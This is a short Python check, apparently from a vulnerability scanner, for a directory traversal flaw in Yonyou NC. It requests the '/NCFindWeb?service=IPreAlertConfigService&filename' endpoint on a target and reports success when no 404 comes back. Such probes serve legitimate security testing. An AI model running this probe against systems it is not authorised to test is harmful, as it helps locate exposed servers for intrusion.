'''
用友NC目录遍历漏洞
'''
import requests

from main import hprint, print_blue


def yonyou_path(url, timeout=6):
    print_blue('用友NC目录遍历')
    return_data = ''
    # if not url[0:1] == '/':
    #     url = url + '/'
    try:
        re = requests.get(url + '/NCFindWeb?service=IPreAlertConfigService&filename', timeout=timeout)
        # print(re)
        if re.text:
            if not 'Error 404 Not Found' in re.text:
                return '成功'
    except ConnectionError as e:
        return '连接失败'
    except TimeoutError as e:
        return '连接超时'
    except Exception as e:
        return '未知错误：' + str(e)